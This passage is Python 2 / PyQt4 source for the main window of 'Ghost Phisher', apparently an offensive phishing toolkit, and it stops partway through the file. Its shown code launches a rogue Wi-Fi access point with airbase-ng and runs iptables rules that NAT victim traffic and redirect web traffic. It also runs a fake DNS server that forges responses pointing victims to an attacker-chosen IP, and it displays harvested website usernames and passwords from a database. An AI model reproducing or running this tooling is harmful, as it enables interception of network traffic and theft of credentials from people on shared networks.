import os                   # For operating system related call e.g [os.listdir()]
import re                   # String matching
import sys                  # For validating execution of GUI components e.g [QApplication(sys.argv)]
import time                 # For displaying time of executed attacks
import thread               # For running services in a sub-processed loop(threads)
import socket               # For network based servcies e.g DNS
import urllib2              # For getting the source code of websites that user wants to clone
import sqlite3              # For saving fetched credentials to database
import shutil               # For file copy operations
import commands             # For executing shell commands and getting system output e.g DHCP3
import subprocess           # For reading live output from terminal processes



from settings import *
from ghost_ui import *
from core.http_core import *
from core import variables
from core import ghost_trap_core
from core import metasploit_payload
from core.update import update_class
from tip_settings import tip_settings
from font_settings import font_settings


from PyQt4 import QtCore, QtGui

cwd = os.getcwd()                                                        # This will be used as working directory after HTTP is launch
                                                                         # Thats because the HTTP server changes directory after launch


# os.environ["ghost_trap_http_server"] = "start"

os.environ["ghost_trap_http_server"] = "stop"
os.environ["ghost_fake_http_control"] = "stop"

# os.environ.get("ghost_trap_http_server") == "stop"
# os.environ.get("ghost_trap_http_server") == "start"


#
# Global variables
#
usable_interface_cards = {}                                     # Dictionary holding interface cards and addresses
interface_card_list = []                                        # Holds interface card names

# Global variables for Fake DNS
dns_contol = 1                                                  # Used to control the DNS Service
dns_connections = 0                                             # Display numbers of dns connections on the tab label
dns_ip_and_websites = {}                                        # Holds mappings of fake ip to dns

# Global variables for Fake DHCP
dhcp_installation_status = ''                                 # Holds the DHCP installation status
dhcp_server_binary = ''
dhcp_config_file = "/tmp/ghost_dhcpd.conf"
dhcp_pid_file = "/tmp/ghost_dhcpd.pid"


# Global variables for Fake HTTP
http_server_port = 80                                           # Default HTTP port
http_control = 0                                                # Used to control the credential searching thread

# Global variables for Credential Harvester
captured_credential = 0                                         # Holds the number of captured crdentials

ghost_settings = Ghost_settings()                               # Ghost settings file object

# Ghost Trap HTTP Object
ghost_trap_http = ghost_trap_core.Ghost_Trap_http()             # Ghost Trap HTTP Class


class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class for all GUI functional definitions
    ''' Main Class for GUI'''
    def __init__(self):
        QtGui.QDialog.__init__(self)

        self.setupUi(self)
        self.retranslateUi(self)
        self.dns_stop.setEnabled(False)
        self.dhcp_stop.setEnabled(False)
        self.http_stop.setEnabled(False)
        self.ghost_spawn_stop.setEnabled(False)
        self.monitor_button.setEnabled(False)
        self.access_stop.setEnabled(False)
        self.access_start.setEnabled(False)
        self.domain_add_button.setEnabled(False)
        self.groupBox_16.setEnabled(False)

        self.check_root_priviledges()   # Check root priviledges

        self.dns_control = 1     # Notifies Ghost Trap of DNS Status

        # Ghost Trap method constructor calls and variables
        self.encode_number_list()
        self.metasploit_payloads()
        self.metasploit_installation()

        self.form_variables = None
        self.fake_http_object = None
        self.custom_spawn_page_path = None

        self.custom_windows_exec_path = None
        self.custom_linux_exec_path = None

        self.dhcp_cache ={}


        self.metasploit_payload_choice()
        self.vulnarabilty_page_choice()

        self.red_led = "%s/gui/images/red_led.png"%(cwd)
        self.green_led = "%s/gui/images/green_led.png"%(cwd)

        # Thread execute Tip settings dialog after 5 seconds
        thread.start_new_thread(self.run_tips_thread,())

        # Get data from database from initialization
        global previous_database_data


        # Metasploit Class object
        self.metasploit_object = metasploit_payload.metasploit()             #  Metasploit Thread class
        self.update_function = update_class()

        previous_database_data = self.fetch_data()

        items = str(self.fetch_data()).count('u')
        try:
            for iterate in range(0,items/3):

                self.credential_table.insertRow(iterate)

                current_credential = previous_database_data[iterate]           # Hold data like (u'www.foo-bar.com',u'username',u'password)

                website = QtGui.QTableWidgetItem()
                username = QtGui.QTableWidgetItem()
                password = QtGui.QTableWidgetItem()

                website.setText(current_credential[0])
                self.credential_table.setItem(iterate,0,website)
                username.setText(current_credential[1])
                self.credential_table.setItem(iterate,1,username)
                password.setText(current_credential[2])
                self.credential_table.setItem(iterate,2,password)

        except IndexError:pass

        #
        # Check if DHCP3 Server service is installed on the computer
        #
        global dhcp_installation_status
        global dhcp_server_binary
        global dhcp_config_file
        global dhcp_pid_file

        installation_status = commands.getstatusoutput('which dhcpd3')
        if installation_status[0] == 0:
            self.label.setText('<font color=green>DHCP3 Server is installed</font>')
            dhcp_installation_status = 'installed'
            dhcp_server_binary = installation_status[1]
        else:
            installation_status = commands.getstatusoutput('which dhcpd')
            if installation_status[0] == 0:
                self.label.setText('<font color=green>ISC-DHCP Server is installed</font>')
                dhcp_installation_status = 'installed'
                dhcp_server_binary = installation_status[1]
            else:
                self.label.setText('<font color=red>DHCP3 Server is not installed</font>')
                self.dhcp_status.append('<font color=green>To Install DHCP3 Server run:</font>\t<font color=red>apt-get install dhcp3-server</font>')
                dhcp_installation_status = 'not installed'


        installation_status_access = commands.getstatusoutput('which airbase-ng')
        if installation_status_access[0] != 0:
            self.refresh_button.setEnabled(False)
            self.access_textbrowser.append('<font color=green>Airbase-ng is not installed,to get airbase-ng run:</font>\t<font color=red>apt-get install aircrack-ng</font>')

        #
        # Read settings files and append their corresponding last settings to their input area
        #
        if ghost_settings.setting_exists('self.dns_ip_address'):
            self.dns_ip_address.setText(ghost_settings.read_last_settings('self.dns_ip_address'))

        if ghost_settings.setting_exists('self.start_ip'):
            self.start_ip.setText(ghost_settings.read_last_settings('self.start_ip'))

        if ghost_settings.setting_exists('self.subnet_ip'):
            self.subnet_ip.setText(ghost_settings.read_last_settings('self.subnet_ip'))

        if ghost_settings.setting_exists('self.stop_ip'):
            self.stop_ip.setText(ghost_settings.read_last_settings('self.stop_ip'))

        if ghost_settings.setting_exists('self.fakedns_ip'):
            self.fakedns_ip.setText(ghost_settings.read_last_settings('self.fakedns_ip'))

        if ghost_settings.setting_exists('self.gateway_ip'):
            self.gateway_ip.setText(ghost_settings.read_last_settings('self.gateway_ip'))

        if ghost_settings.setting_exists('self.alternatedns_ip'):
            self.alternatedns_ip.setText(ghost_settings.read_last_settings('self.alternatedns_ip'))

        if ghost_settings.setting_exists('self.website_linedit'):
            self.website_linedit.setText(ghost_settings.read_last_settings('self.website_linedit'))

        if ghost_settings.setting_exists('ip_address_label_2'):
            self.ip_address_label_2.setText(ghost_settings.read_last_settings('ip_address_label_2'))

        if ghost_settings.setting_exists('lineEdit_2'):
            self.lineEdit_2.setText(ghost_settings.read_last_settings('lineEdit_2'))

        if ghost_settings.setting_exists('access_name_edit'):
            self.access_name_edit.setText(ghost_settings.read_last_settings('access_name_edit'))


        if ghost_settings.setting_exists('self.linux_exec_edit'):
            self.linux_exec_checkbox.setChecked(True)
            self.linux_exec_edit.setText(ghost_settings.read_last_settings('self.linux_exec_edit'))
        else:
            self.linux_exec_checkbox.setChecked(False)


        if ghost_settings.setting_exists("self.windows_exec_edit"):
            self.windows_exec_checkbox.setChecked(True)
            self.windows_exec_edit.setText(ghost_settings.read_last_settings("self.windows_exec_edit"))
        else:
            self.windows_exec_checkbox.setChecked(False)



        global usable_interface_cards
        global interface_cards_http
        global interface_cards

        card_list = os.listdir('/sys/class/net')                        # Directory contains list of interface cards
        terminal_output = commands.getstatusoutput('ifconfig')[1]

        for iterate in card_list:
            if iterate in terminal_output:
                if iterate != 'lo':                                     # Skip default loopback address name cause that will be manually defined
                    interface_card_list.append(iterate)

        for available_cards in interface_card_list:
            ip_output = commands.getstatusoutput('ifconfig %s | grep \'s\''%(available_cards))
            interface_list  = ip_output[1].splitlines()
            process_interface_list = interface_list[0].strip(' ')
            try:
                index_number = process_interface_list.index('Bcast:')
                ip_address = process_interface_list[0:index_number].strip('Mask: inet addr: ')
                usable_interface_cards[available_cards] = ip_address        # Add interfaces cards and IP addresses to dictionary
            except ValueError:
                if 'Mask:' in process_interface_list:
                    index_number = process_interface_list.index('Mask:')
                    ip_address = process_interface_list[0:index_number].strip('Mask: inet addr: ')
                    usable_interface_cards[available_cards] = ip_address

                #Else will not add card if card does not have Ip flags

        usable_interface_cards['Default Route Address'] = '0.0.0.0'                 # Add default route address to dictionary
        usable_interface_cards['Loopback Address'] = '127.0.0.1'                    # Adds the loopback address to the dictionary

        interface_cards = usable_interface_cards.keys()
        interface_cards_http = usable_interface_cards.keys()
        interface_cards.sort()
        interface_cards.reverse()

        # Add iterface card names to the DNS interface combo and HTTP combo

        # HTTP Server runs on default route by default,"0.0.0.0" will cause problems if used on the forms action POST e.g action="http://0.0.0.0/"
        # therefore the program uses another interfaces ip address for the action posts
        interface_cards_http.remove('Default Route Address')
        interface_cards_http.reverse()

        self.card_interface_combo.addItems(interface_cards)
        self.http_interface_combo.addItems(interface_cards_http)

        self.spawn_http_interface_combo.addItems(interface_cards)

        interface_card_ip = []                                                      # List holding Ip addresses derived from the dictionary
        selected_interface = str(self.card_interface_combo.currentText())
        interface_card_ip.append(usable_interface_cards[selected_interface])

        self.ip_address_combo.addItems(interface_card_ip)                           #Adds the IP address of the First Card to DNS IP combo
        self.http_ip_combo.addItems(interface_card_ip)           #Adds the IP address of the First Card to HTTP IP combo
        self.spawn_ip_combo.addItems(interface_card_ip)             # Adds the IP address of the First Card to the Ghost Spawn combo

        self.port_setting_edit.setText("4444")
        self.ghost_trap_http_edit.setText("80")
        self.ip_address_edit.setText(self.spawn_ip_combo.currentText())


        self.current_card_label.setText("<font color=green>Current Interface:</font>  %s"%(selected_interface))


        # Add channel list to fake access point combo
        channels = []
        for iterate in range(1,14):
            channels.append(str(iterate))

        self.channel_combo.addItems(channels)

        #
        # Connection to GUI object slots and Signals
        #
        self.connect(self.card_interface_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.update_dns_address)
        self.connect(self.http_interface_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.update_http_address)
        self.connect(self.spawn_http_interface_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.update_ghost_spawn_interfaces)
        self.connect(self.resolveall_radio,QtCore.SIGNAL("clicked()"),self.update_selection)
        self.connect(self.respond_domain_radio,QtCore.SIGNAL("clicked()"),self.update_selection)
        self.connect(self.dns_stop,QtCore.SIGNAL("clicked()"),self.stop_dns)
        self.connect(self.dns_start,QtCore.SIGNAL("clicked()"),self.launch_dns)
        self.connect(self.dhcp_start,QtCore.SIGNAL("clicked()"),self.launch_dhcp)
        self.connect(self,QtCore.SIGNAL("new dhcp connection"),self.display_leases_client)
        self.connect(self.website_button,QtCore.SIGNAL("clicked()"),self.browse_webpage)
        self.connect(self.emulate_website_radio,QtCore.SIGNAL("clicked()"),self.set_usable)
        self.connect(self.select_website_radio,QtCore.SIGNAL("clicked()"),self.set_usable)
        self.connect(self.http_stop,QtCore.SIGNAL("clicked()"),self.stop_http)
        self.connect(self.http_start,QtCore.SIGNAL("clicked()"),self.launch_http_server)
        self.connect(self.dhcp_stop,QtCore.SIGNAL("clicked()"),self.stop_dhcp)
        self.connect(self.insert_button,QtCore.SIGNAL("clicked()"),self.insert_credential)
        self.connect(self.delete_button,QtCore.SIGNAL("clicked()"),self.delete_credential)
        self.connect(self.savechanges_button,QtCore.SIGNAL("clicked()"),self.save_changes)
        self.connect(self.start_ip,QtCore.SIGNAL("textChanged(QString)"),self.determine_subnet)
        self.connect(self.domain_add_button,QtCore.SIGNAL("clicked()"),self.ip_to_website)
        self.connect(self.refresh_button,QtCore.SIGNAL("clicked()"),self.refresh_card)
        self.connect(self.access_start,QtCore.SIGNAL("clicked()"),self.launch_Access_Point)
        self.connect(self.comboBox,QtCore.SIGNAL("currentIndexChanged(QString)"),self.card_details)
        self.connect(self.monitor_button,QtCore.SIGNAL("clicked()"),self.set_monitor)
        self.connect(self,QtCore.SIGNAL("dns started"),self.dns_started)
        self.connect(self,QtCore.SIGNAL("dns failed"),self.dns_failed)
        self.connect(self,QtCore.SIGNAL("system interrupt"),self.dns_system_interrupt)
        self.connect(self,QtCore.SIGNAL("dns stopped"),self.stop_dns)
        self.connect(self,QtCore.SIGNAL("new client connection"),self.update_dns_connections)
        self.connect(self,QtCore.SIGNAL("run tips"),self.run_tips)
        self.connect(self,QtCore.SIGNAL("access point output"),self.update_access_output)
        self.connect(self,QtCore.SIGNAL("access point error"),self.update_access_error)
        self.connect(self,QtCore.SIGNAL("access point started"),self.access_point_started)
        self.connect(self.access_stop,QtCore.SIGNAL("clicked()"),self.stop_access_point)
        self.connect(self.rouge_radio,QtCore.SIGNAL("clicked()"),self.clear_key_area)
        self.connect(self,QtCore.SIGNAL("triggered()"),QtCore.SLOT("close()"))

        self.connect(self.ghost_vul_combo,QtCore.SIGNAL("clicked()"),self.vulnarabilty_page_choice)
        self.connect(self.custom_vul_combo,QtCore.SIGNAL("clicked()"),self.vulnarabilty_page_choice)
        self.connect(self.metasploit_payload_radio,QtCore.SIGNAL("clicked()"),self.metasploit_payload_choice)
        self.connect(self.custom_payload_radio,QtCore.SIGNAL("clicked()"),self.custom_payload_choice)
        self.connect(self.custom_page_button,QtCore.SIGNAL("clicked()"),self.browse_custom_webpage)
        self.connect(self.windows_exec_button,QtCore.SIGNAL("clicked()"),self.custom_windows_executable_payload)
        self.connect(self.linux_exec_button,QtCore.SIGNAL("clicked()"),self.custom_linux_executable_payload)

        self.connect(self.ghost_spawn_start,QtCore.SIGNAL("clicked()"),self.launch_ghost_trap)
        self.connect(self.ghost_spawn_stop,QtCore.SIGNAL("clicked()"),self.ghost_trap_stop)

        self.connect(ghost_trap_http,QtCore.SIGNAL("got new connection"),self.display_new_connection)
        self.connect(ghost_trap_http,QtCore.SIGNAL("new download"),self.new_download)

        self.connect(self.update_function,QtCore.SIGNAL("new update available"),self.update_window)

        # Start Update checker
        thread.start_new_thread(self.update_function.update_initializtion_check,())



    #########################################################################
    #                           TIPS AND FONT SETTINGS                      #
    #########################################################################

    def check_root_priviledges(self):
        if(os.getenv('LOGNAME','none').lower() != 'root'):
            QtGui.QMessageBox.warning(self,"Insufficient Priviledge","Ghost Phisher requires root priviledges to function properly,\
            please run as root")
            sys.exit(1)


    def update_window(self):
        self.update_function.display_update_version()
        self.update_function.exec_()


    def keyPressEvent(self,event):
        '''Runs the font dialog window, when user
            presses F2'''
        if event.key() == QtCore.Qt.Key_F2:
            font_run = font_settings()
            font_run.exec_()

        if event.key() == QtCore.Qt.Key_F3:     # Resize Ghost windows (netbook users)
            if self.groupBox_16.isVisible() or self.groupBox_2.isVisible() or self.groupBox_5.isVisible() or self.groupBox_8.isVisible() or \
            self.metasploit_settings_box.isVisible() or self.custom_payload_box.isVisible() or self.spawn_http_setting_box.isVisible():
                self.groupBox_16.setVisible(False)
                self.groupBox_2.setVisible(False)
                self.groupBox_5.setVisible(False)
                self.groupBox_8.setVisible(False)
                self.metasploit_settings_box.setVisible(False)
                self.custom_payload_box.setVisible(False)
                self.spawn_http_setting_box.setVisible(False)
                self.setFixedHeight(600)
            else:
                self.groupBox_16.setVisible(True)
                self.groupBox_2.setVisible(True)
                self.groupBox_5.setVisible(True)
                self.groupBox_8.setVisible(True)
                self.metasploit_settings_box.setVisible(True)
                self.custom_payload_box.setVisible(True)
                self.spawn_http_setting_box.setVisible(False)
                self.setFixedHeight(685)



    def run_tips_thread(self):
        ''' thread component emits
            signal to evaluate execution
            of tips dialog after 2 seconds
        '''
        import time
        time.sleep(2)
        self.emit(QtCore.SIGNAL("run tips"))


    def run_tips(self):
        ''' Run tips dialog and display
            to user useful information
            on usage
        '''
        run_tips = tip_settings()
        if setting_file.setting_exists('tip-settings'):
            if int(ghost_settings.read_last_settings('tip-settings')) == 1:
                run_tips.exec_()
        else:
            run_tips.exec_()




    #########################################################################
    #               FAKE AP  DEFINITION ,FUNCTIONS AND SIGNALS              #
    #########################################################################

    def refresh_card(self):
        ''' functions checks for wireless
            interface cards connected
        '''
        for disable_monitor in os.listdir('/sys/class/net'):
            commands.getstatusoutput('airmon-ng stop %s'%(disable_monitor))
        compatible_cards = commands.getstatusoutput("airmon-ng | egrep -e '^[a-z]{2,4}[0-9]'")[1]
        self.comboBox.clear()
        if compatible_cards != '':
            card_list = []
            compatible_cards = commands.getstatusoutput("airmon-ng | egrep -e '^[a-z]{2,4}[0-9]'")[1]
            for cards in os.listdir('/sys/class/net'):
                if cards in compatible_cards:
                    if cards not in card_list:
                        card_list.append(cards)

            self.comboBox.addItems(card_list)
            self.access_textbrowser.clear()
            self.monitor_button.setEnabled(True)
            self.card_details()
        else:
            self.access_textbrowser.clear()
            self.access_textbrowser.append('<font color=red>No wireless interface card detected</font>')

    def card_details(self):
        global mac_address
        selected_card = str(self.comboBox.currentText())
        if selected_card != '':
            compatible_cards = commands.getstatusoutput("airmon-ng | egrep -e '^[a-z]{2,4}[0-9]'")[1]
            card_process = compatible_cards.splitlines()
            for card_detail in card_process:
                if selected_card in str(card_detail):
                    self.acess_interface.setText('Current Interface:&nbsp;<font color=green> %s</font>'%(card_detail.split()[0]))
                    self.driver_label.setText('Driver:&nbsp;<font color=green> %s</font>'%(card_detail.split()[2]))
                    mac_process = open('/sys/class/net/%s/address'%(selected_card))
                    mac_address = mac_process.read().strip('\n')
                    self.mac_address_label.setText('Mac Address:&nbsp;<font color=green> %s</font>'%(mac_address))
                    self.monitor_label.setText('Monitor:&nbsp;<font color=red>Not Started</font>')
                    self.monitor_button.setEnabled(True)
                    mac_process.close()


    def set_monitor(self):
        global monitor
        selected_card = str(self.comboBox.currentText())
        attempt_monitor = commands.getstatusoutput("airmon-ng start %s"%(selected_card))
        mon_string = ''
        if attempt_monitor[0] == 0:
            if 'monitor mode enabled' in attempt_monitor[1]:
                for iterate in os.listdir('/sys/class/net'):
                    if iterate.startswith('mon'):
                        mon_string += iterate
                        break
                if mon_string == '':
                    monitor = selected_card
                else:
                    monitor = mon_string

                self.monitor_label.setText('Monitor:&nbsp;<font color=green> %s</font>'%(monitor))
                self.monitor_button.setEnabled(False)
                self.groupBox_16.setEnabled(True)
                self.access_start.setEnabled(True)
        else:
            self.access_textbrowser.append('<font color=red>Failed to set %s on monitor mode: %s</font>'%(selected_card,attempt_monitor[1]))


    def launch_Access_Point(self):
        global access_name
        global access_point_ip
        global encryption_key
        global access_point_control

        access_point_control = 1
        access_name = str(self.access_name_edit.text())
        access_point_ip = str(self.ip_address_label_2.text())
        encryption_key = str(self.lineEdit.text())

        if 'access_point_log' in os.listdir('/tmp/'):
            os.remove('/tmp/access_point_log')

        if access_name == '':
            QtGui.QMessageBox.warning(self,"NULL Access Point Name","Please input a name you intend to name the access point e.g Rouge-WIFI")
            access_point_control = 0
        elif access_point_ip.count('.') < 3:
            access_point_control = 0
            QtGui.QMessageBox.warning(self,"Invalid IP address","Please input a valid IP address in the (Access Point Name:) section")
        elif self.wpa_radio.isChecked():
            if encryption_key == '':
                access_point_control = 0
                QtGui.QMessageBox.warning(self,"NULL Encryption Key","Please input a key you intend to encrypt exchange information in on the Key text area e.g 1234567890")
        elif self.wep_radio.isChecked():
            if encryption_key == '':
                access_point_control = 0
                QtGui.QMessageBox.warning(self,"NULL Encryption Key","Please input a key you intend to encrypt exchange information in on the Key text area e.g 1234567890")

        if access_point_control != 0:
            self.access_textbrowser.append('<font color=green>Starting Fake Access Point...</font>')
            thread.start_new_thread(self.rouge_launch,())
            thread.start_new_thread(self.update_browser_thread,())


    def clear_key_area(self):
        self.lineEdit.clear()


    def update_access_error(self):
        global access_point_error
        self.access_textbrowser.clear()
        self.access_start.setEnabled(True)
        self.access_stop.setEnabled(False)
        self.access_textbrowser.append('<font color=red>Unable to start Fake AP: %s</font>'%(access_point_error))


    def update_access_output(self):
        global mac_address

        self.access_textbrowser.clear()
        try:
            access_point_file = open('/tmp/access_point_log')
            access_point_output = access_point_file.read()
            if access_point_output.count('Client') != 0:
                self.access_connection_label.setText('Connections:<font color=green> %s</font>'\
                                                     %(str(access_point_output.count('Client'))))
            for iterate in access_point_output.splitlines():
                self.access_textbrowser.append('<font color=green> %s</font>'%(iterate))
            access_point_file.close()
        except IOError:
            self.stop_access_point()


    def access_point_started(self):
        global essid
        global ip_address_text

        self.groupBox_16.setEnabled(False)
        self.access_point_label.setText('Acess Point Name:<font color=green>  %s</font>'%(essid))
        self.channel_label.setText('Channel:<font color=green> %s</font>'%(channel))
        self.ip_address_label.setText('IP address:<font color=green> %s</font>'%(ip_address_text))
        self.access_runtime.setText('Runtime:<font color=green> %s</font>'%(time.ctime()))
        self.main_mac_address_label.setText('Mac Address:<font color=green> %s</font>'%(mac_address))
        self.access_start.setEnabled(False)
        self.access_stop.setEnabled(True)
        ghost_settings.create_settings('self.access_name_edit',essid)
        ghost_settings.create_settings('ip_address_label_2',ip_address_text)

        # Gives Acess point connection client internet access
        filter_interface = ['Default Route Address','Loopback Address']
        for iterate in usable_interface_cards.keys():
            if iterate not in filter_interface:
                commands.getstatusoutput("""iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p udp -j DNAT --to %s
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000"""%\
                                               (iterate,usable_interface_cards[iterate])
                                               )


        usable_interface_cards['at0']= ip_address_text

        access_interface = []
        for iterate in usable_interface_cards.keys():
            access_interface.append(iterate)
        access_interface.sort()
        access_interface.reverse()

        self.card_interface_combo.clear()
        self.card_interface_combo.addItems(access_interface)

        interface_cards_httpa = []
        for iterate2 in usable_interface_cards.keys():
            if iterate2 != 'Default Route Address':
                interface_cards_httpa.append(iterate2)

        interface_cards_httpa.sort()
        interface_cards_httpa.reverse()

        self.http_interface_combo.clear()
        self.http_interface_combo.addItems(interface_cards_httpa)

        self.spawn_http_interface_combo.clear()
        self.spawn_http_interface_combo.addItems(interface_cards_httpa)





    def stop_access_point(self):
        global access_point_control
        access_point_control = 0
        if 'access_point_log' in os.listdir('/tmp/'):
            os.remove('/tmp/access_point_log')
        commands.getstatusoutput('killall airbase-ng')
        self.groupBox_16.setEnabled(True)
        self.access_point_label.setText('Acess Point Name:')
        self.channel_label.setText('Channel:')
        self.ip_address_label.setText('IP address:')
        self.access_runtime.setText('Runtime:')
        self.main_mac_address_label.setText('Mac Address:')
        self.access_textbrowser.append('<font color=red>Access Point Stopped at: %s</font>'%(time.ctime()))
        self.access_start.setEnabled(True)
        self.access_stop.setEnabled(False)



    def rougue_launch_phase(self):
        global ip_address_text

        period_number = ip_address_text.index('.')
        first_octect = ip_address_text[0:period_number]
        if int(first_octect) in range(1,127):               # Class A IP address (netmask will be 255.0.0.0)
            netmask = '255.0.0.0'
        elif int(first_octect) in range(128,191):           # Class B IP address (netmask will be 255.255.0.0)
            netmask = '255.255.0.0'
        else:
            netmask = '255.255.255.0'

        while 'access_point_log' not in os.listdir('/tmp/'):
            time.sleep(3)
        commands.getstatusoutput('ifconfig at0 up')
        commands.getstatusoutput('ifconfig at0 %s netmask %s'%(ip_address_text,netmask))
        self.emit(QtCore.SIGNAL("access point started"))




    def rouge_launch(self):
        global essid
        global channel
        global mac_address
        global ip_address_text
        global access_point_control
        global monitor
        global access_point_error


	essid = str(self.access_name_edit.text())
        channel = str(self.channel_combo.currentText())
        ip_address_text = str(self.ip_address_label_2.text())
        key = str(self.lineEdit.text())

        thread.start_new_thread(self.rougue_launch_phase,())

        if self.rouge_radio.isChecked():
            output = commands.getstatusoutput("airbase-ng -a %s -e '%s' -c %s %s > /tmp/access_point_log"%(mac_address,essid,channel,monitor))
        elif self.wep_radio.isChecked():
            output = commands.getstatusoutput("airbase-ng -a %s -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(mac_address,essid,channel,key,monitor))
        else:
            output = commands.getstatusoutput("airbase-ng -a %s -z 2 -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(mac_address,essid,channel,key,monitor))



        if output[0] > 0:
            access_point_error = output[1]
            access_point_control = 0
            self.emit(QtCore.SIGNAL("access point error"))




    def update_browser_thread(self):
        global access_point_control
        while access_point_control ==  1:
            time.sleep(3)
            self.emit(QtCore.SIGNAL("access point output"))






    #########################################################################
    #       FAKE DNS SERVER DEFINITION ,FUNCTIONS AND SIGNALS               #
    #########################################################################

    def update_dns_address(self):
        ''' Changes the ipaddress on ip combo when
            user changes the index of interface combo
        '''
        global usable_interface_cards

        ip_address = []             #Holds ip address of the selected card

        selected_interface = str(self.card_interface_combo.currentText())   #currently selected interface card
        try:
            ip_address.append(usable_interface_cards[selected_interface])
        except KeyError:
            pass
        self.ip_address_combo.clear()                                       #clear the ip address combo
        self.ip_address_combo.addItems(ip_address)                          #display ip address on combo
        self.current_card_label.setText("<font color=green>\
                                        Current Interface:</font>  %s"%(selected_interface))

    def update_selection(self):
        ''' Disables un-used settings buttons if
            not selected
        '''
        if self.resolveall_radio.isChecked():
            self.domain_add_button.setEnabled(False)
        else:
            self.domain_add_button.setEnabled(True)



    def dns_started(self):
        self.dns_connection_label.setText('Connections:')
        self.dns_textbrowser.append('<font color=green>Started DNS Service at %s'%(time.ctime()))
        self.label_5.setText("<font color=green>Runtime:</font> %s"%(time.ctime()))
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> %s"%\
                                           (str(self.ip_address_combo.currentText())))
        self.dns_textbrowser.append(" ")


    def update_dns_connections(self):
        global dns_connections
        dns_connections += 1
        self.dns_connection_label.setText('Connections:<font color=green>\t %s</font>'%(dns_connections))


    def announce_client(self,client_hostname,address):
        global selected_dns_ip_address
        if len(address) > 2:
            self.dns_textbrowser.append('<font color=blue>%s just got our Fake IP address for %s</font>'%(client_hostname,address))
        else:
            if str(client_hostname) != str(selected_dns_ip_address):
                self.dns_textbrowser.append('<font color=blue>%s just got our Fake IP address</font>'%(client_hostname))



    def break_last_loop_thread(self):
        global selected_dns_ip_address
        dns_fake_ip = str(selected_dns_ip_address)
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock.sendto('empty query',(dns_fake_ip,53))   # This ultimately breaks the last turn of the DNS loop to aviod restart exceptions
        sock.close()


    def stop_dns(self):
        global dns_connections
        self.dns_control = 1
        dns_connections = 0
        self.dns_start.setEnabled(True)
        self.dns_stop.setEnabled(False)
        thread.start_new_thread(self.break_last_loop_thread,())     # This thread breaks the last DNS loop, we get segmentfaults if we run it here directly
        self.label_5.setText("<font color=green>Runtime:</font> Service not started")
        self.dns_textbrowser.append('<font color=red>DNS Service stopped at %s'%(time.ctime()))
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> Service not started")


    def dns_failed(self):
        self.dns_control = 1
        self.dns_start.setEnabled(True)
        self.dns_stop.setEnabled(False)
        self.label_5.setText("<font color=green>Runtime:</font> Service not started")
        self.dns_textbrowser.append('<font color=red>DNS Server failed to start: %s'%(exception))
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> Service not started")
        thread.start_new_thread(self.break_last_loop_thread,())

    def dns_system_interrupt(self):

        self.dns_control = 1
        self.dns_start.setEnabled(True)
        self.dns_stop.setEnabled(False)
        self.label_5.setText("<font color=green>Runtime:</font> Service not started")
        self.dns_textbrowser.append('<font color=red>Shit!, we got a system interrupt, Please restart service')
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> Service not started")


    def dns_response(self,query,fake_ip):
        ''' function crafts query packets to be sent
            to client,packets are made in respect to
            the IETF standard.
            http://www.ietf.org/rfc/rfc1035.txt
        '''
        packet = ''
        packet+=query[:2] + "\x81\x80"
        packet+=query[4:6] + query[4:6] + '\x00\x00\x00\x00'                # Questions and Answers Counts
        packet+=query[12:]                                                  # Original Domain Name Question
        packet+='\xc0\x0c'                                                  # Pointer to domain name
        packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'                  # Response type, ttl and resource data length -> 4 bytes
        packet+=str.join('',map(lambda x: chr(int(x)),fake_ip.split('.')))  # 4bytes of IP
        return packet

    #
    # DNS Server Thread
    #
    def dns_server_thread(self,alternate,arg2):                                  # alternate variable tells the application that im running the program in a ip to wesite bases
        ''' Thread open a Default UDP port 53
            for servicing client queries.
        '''
        global exception
        global dns_ip_and_websites
        global selected_dns_ip_address

        dns_fake_ip = str(self.dns_ip_address.text())
        selected_dns_ip_address = str(self.ip_address_combo.currentText())
        time.sleep(2)
        try:
            DNS_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            DNS_socket.bind((selected_dns_ip_address,53))
            self.emit(QtCore.SIGNAL("dns started"))
            while True:
                if self.dns_control == 0:
                    if alternate != None:
                        DNS_query = DNS_socket.recvfrom(1024)
                        for website in dns_ip_and_websites.keys():
                            website_string = str(website)
                            process = website_string[website_string.index('.')+1:-1]
                            striped_webstring = process[0:process.index('.')]
                            if striped_webstring in DNS_query[0]:
                                corresponding_ip = dns_ip_and_websites[website]
                                if DNS_query[1][0] not in ghost_trap_http.cookies:
                                    DNS_socket.sendto(self.dns_response(DNS_query[0],corresponding_ip),DNS_query[1])
                                    self.announce_client(DNS_query[1][0],website)
                                    self.emit(QtCore.SIGNAL("new client connection"))
                    else:
                        DNS_query = DNS_socket.recvfrom(1024)
                        if DNS_query[1][0] not in ghost_trap_http.cookies:
                            DNS_socket.sendto(self.dns_response(DNS_query[0],dns_fake_ip),DNS_query[1])
                            self.announce_client(DNS_query[1][0],'1')
                            self.emit(QtCore.SIGNAL("new client connection"))
                else:
                    break
        except socket.error,e:
            exception = e[1]
            self.emit(QtCore.SIGNAL("dns failed"))
            DNS_socket.close()

    def ip_to_website(self):
        ''' maps fake ip address to corresponding
            websites in the global dictionary
        '''
        global dns_ip_and_websites
        domain_ip_address = str(self.domain_ip.text())
        website_address = str(self.domain_label.text())
        if domain_ip_address.count('.') != 3:                                   # Check if inputed data is valid
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid Fake IP address to map to website")
        elif len(website_address) < 3:
            QtGui.QMessageBox.warning(self,"Invalid Web Address","Please input a web address to map to IP address")
        else:
            dns_ip_and_websites[website_address] = domain_ip_address
